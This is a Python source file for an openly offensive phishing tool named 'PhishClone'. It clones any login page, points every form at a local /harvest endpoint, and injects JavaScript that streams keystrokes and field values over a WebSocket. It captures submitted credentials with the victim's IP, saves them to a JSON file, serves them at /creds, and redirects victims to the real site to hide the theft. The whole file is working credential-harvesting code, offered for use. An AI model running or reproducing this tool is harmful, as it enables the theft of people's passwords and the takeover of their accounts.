#!/usr/bin/env python3
"""
phantom-arsenal / PhishClone v2.1
Clone any login page → serve locally → harvest credentials + IP + keystrokes
"""

import sys, os, re, json, datetime, threading
import urllib.request, urllib.parse
import http.server, socketserver

CREDS_FILE = "captured_creds.json"
LOG_FILE   = "keystrokes.log"
def find_free_port(start):
    import socket
    for p in range(start, start + 100):
        try:
            s = socket.socket()
            s.bind(('', p))
            s.close()
            return p
        except OSError:
            continue
    return start

_base   = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
PORT    = find_free_port(_base)
WS_PORT = find_free_port(PORT + 1)

def fetch(url):
    req = urllib.request.Request(url, headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0',
        'Accept': 'text/html,application/xhtml+xml,*/*',
        'Accept-Language': 'en-US,en;q=0.9',
    })
    with urllib.request.urlopen(req, timeout=15) as r:
        charset = r.headers.get_param('charset') or 'utf-8'
        return r.read().decode(charset, errors='replace'), r.geturl()

def rewrite(html, base_url, ws_port):
    p = urllib.parse.urlparse(base_url)
    base = p.scheme + "://" + p.netloc

    def abs_url(m):
        attr, q, v = m.group(1), m.group(2), m.group(3)
        if v.startswith(('http','data:','#','javascript:','mailto:','tel:')):
            return m.group(0)
        if v.startswith('//'):
            return attr + '=' + q + p.scheme + ':' + v + q
        if v.startswith('/'):
            return attr + '=' + q + base + v + q
        return attr + '=' + q + base + '/' + v + q

    html = re.sub(r'(src|href)=(["\'])([^"\'> ]+)\2', abs_url, html, flags=re.I)
    html = re.sub(r'(<form[^>]*)\s+action=["\'][^"\']*["\']', r'\1 action="/harvest"', html, flags=re.I)
    html = re.sub(r'(<form)(?![^>]*action=)([^>]*>)', r'\1 action="/harvest"\2', html, flags=re.I)
    html = re.sub(r'(<form[^>]*)\s+method=["\']get["\']', r'\1 method="POST"', html, flags=re.I)

    redirect_url = base_url.replace("'", "\\'")
    ws_js = str(ws_port)

    inject = (
        "<script>\n"
        "(function(){\n"
        "  var ws;\n"
        "  function connectWS(){\n"
        "    try{\n"
        "      ws = new WebSocket('ws://' + location.hostname + ':" + ws_js + "');\n"
        "      ws.onclose = function(){ setTimeout(connectWS, 2000); };\n"
        "    }catch(e){}\n"
        "  }\n"
        "  connectWS();\n"
        "  function send(type, data){\n"
        "    if(ws && ws.readyState === 1) ws.send(JSON.stringify({type: type, data: data, ts: new Date().toISOString()}));\n"
        "  }\n"
        "  document.addEventListener('keyup', function(e){\n"
        "    var t = e.target;\n"
        "    send('keystroke', {key: e.key, field: t.name || t.id || t.placeholder || t.type || 'unknown', value: t.value});\n"
        "  }, true);\n"
        "  document.addEventListener('submit', function(e){\n"
        "    e.preventDefault();\n"
        "    var f = e.target;\n"
        "    var data = {};\n"
        "    new FormData(f).forEach(function(v, k){ data[k] = v; });\n"
        "    send('submit', data);\n"
        "    fetch('/harvest', {\n"
        "      method: 'POST',\n"
        "      headers: {'Content-Type': 'application/json'},\n"
        "      body: JSON.stringify(data)\n"
        "    }).then(function(){ window.location = '" + redirect_url + "'; });\n"
        "  }, true);\n"
        "  document.addEventListener('click', function(e){\n"
        "    var el = e.target;\n"
        "    if(el && (el.type === 'submit' || el.tagName === 'BUTTON')){\n"
        "      var inputs = document.querySelectorAll('input');\n"
        "      var data = {};\n"
        "      inputs.forEach(function(i){ if(i.value) data[i.name || i.id || i.type] = i.value; });\n"
        "      if(Object.keys(data).length) send('click_harvest', data);\n"
        "    }\n"
        "  }, true);\n"
        "})();\n"
        "</script>\n"
        "</body>"
    )

    if re.search(r'</body>', html, re.I):
        html = re.sub(r'</body>', inject, html, flags=re.I)
    else:
        html += inject

    return html

# ── Simple WebSocket server (no deps) ────────────────────────────────────────
import socket, hashlib, base64, struct

def ws_handshake(conn):
    data = conn.recv(4096).decode('utf-8', errors='replace')
    key = re.search(r'Sec-WebSocket-Key: (.+)', data)
    if not key:
        return False
    k = key.group(1).strip()
    magic = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
    accept = base64.b64encode(hashlib.sha1((k + magic).encode()).digest()).decode()
    resp = (
        "HTTP/1.1 101 Switching Protocols\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Accept: " + accept + "\r\n\r\n"
    )
    conn.send(resp.encode())
    return True

def ws_recv(conn):
    try:
        header = conn.recv(2)
        if len(header) < 2:
            return None
        opcode = header[0] & 0x0F
        if opcode == 8:
            return None
        length = header[1] & 0x7F
        if length == 126:
            length = struct.unpack('>H', conn.recv(2))[0]
        elif length == 127:
            length = struct.unpack('>Q', conn.recv(8))[0]
        mask = header[1] >> 7
        if mask:
            masks = conn.recv(4)
            data = bytearray(conn.recv(length))
            for i in range(len(data)):
                data[i] ^= masks[i % 4]
            return data.decode('utf-8', errors='replace')
        return conn.recv(length).decode('utf-8', errors='replace')
    except:
        return None

def handle_ws_client(conn, addr):
    if not ws_handshake(conn):
        conn.close()
        return
    while True:
        msg = ws_recv(conn)
        if msg is None:
            break
        try:
            d = json.loads(msg)
            t = d.get('type', '')
            if t == 'keystroke':
                ks = d['data']
                line = "[KEYSTROKE] field=" + str(ks.get('field','?')) + " key=" + str(ks.get('key','?')) + " value=" + str(ks.get('value',''))
                print("\033[93m" + line + "\033[0m")
                with open(LOG_FILE, 'a') as f:
                    f.write(line + '\n')
            elif t in ('submit', 'click_harvest'):
                line = "[" + t.upper() + "] " + json.dumps(d['data'], ensure_ascii=False)
                print("\033[92m" + line + "\033[0m")
                with open(LOG_FILE, 'a') as f:
                    f.write(line + '\n')
        except:
            pass
    conn.close()

def start_ws_server(port):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(('0.0.0.0', port))
    srv.listen(10)
    while True:
        try:
            conn, addr = srv.accept()
            t = threading.Thread(target=handle_ws_client, args=(conn, addr), daemon=True)
            t.start()
        except:
            pass

# ── HTTP server ───────────────────────────────────────────────────────────────
class Handler(http.server.BaseHTTPRequestHandler):
    html   = ""
    target = ""

    def log_message(self, *a):
        pass

    def do_GET(self):
        if self.path == '/':
            body = self.html.encode('utf-8', errors='replace')
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.send_header('Content-Length', str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        elif self.path == '/creds':
            try:
                with open(CREDS_FILE) as f:
                    body = f.read().encode()
            except:
                body = b'[]'
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(body)
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == '/harvest':
            n = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(n).decode('utf-8', 'replace')
            try:
                data = json.loads(body)
            except:
                data = dict(urllib.parse.parse_qsl(body))

            ip = self.client_address[0]
            entry = {
                "time": datetime.datetime.now().isoformat(),
                "ip": ip,
                "target": self.target,
                "credentials": data
            }
            creds = []
            try:
                with open(CREDS_FILE) as f:
                    creds = json.load(f)
            except:
                pass
            creds.append(entry)
            with open(CREDS_FILE, 'w') as f:
                json.dump(creds, f, indent=2, ensure_ascii=False)

            print("\n\033[41m\033[97m [CAPTURED] IP=" + ip + " -> " + json.dumps(data, ensure_ascii=False) + " \033[0m\n")

            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"ok":true}')
        else:
            self.send_response(404)
            self.end_headers()

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 phisher.py <URL> [port]")
        sys.exit(1)

    url = sys.argv[1]

    print("\033[96m")
    print("╔══════════════════════════════════════════╗")
    print("║   phantom-arsenal — PhishClone v2.1     ║")
    print("║   No external dependencies required     ║")
    print("╚══════════════════════════════════════════╝")
    print("\033[0m")
    print("[*] Target   : " + url)
    print("[*] Fetching page...")

    html, final = fetch(url)
    cloned = rewrite(html, final, WS_PORT)

    Handler.html   = cloned
    Handler.target = final

    print("[+] Cloned   : " + str(len(cloned)) + " bytes")

    # start WebSocket thread (no deps — pure stdlib)
    ws_thread = threading.Thread(target=start_ws_server, args=(WS_PORT,), daemon=True)
    ws_thread.start()
    print("[+] WebSocket: ws://0.0.0.0:" + str(WS_PORT) + " (live keystrokes)")

    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("", PORT), Handler) as srv:
        print("[+] Phishing : http://0.0.0.0:" + str(PORT))
        print("[+] Creds    : http://0.0.0.0:" + str(PORT) + "/creds")
        print("[+] Log file : " + LOG_FILE)
        print("\033[93m[*] Waiting for victims... (Ctrl+C to stop)\033[0m\n")
        try:
            srv.serve_forever()
        except KeyboardInterrupt:
            print("\n\033[91m[!] Stopped\033[0m")
            try:
                with open(CREDS_FILE) as f:
                    c = json.load(f)
                print("[+] Total captured: " + str(len(c)))
                for x in c:
                    print("  > " + x['time'] + " | IP=" + x['ip'] + " | " + str(x['credentials']))
            except:
                print("[*] No credentials captured")

if __name__ == '__main__':
    main()
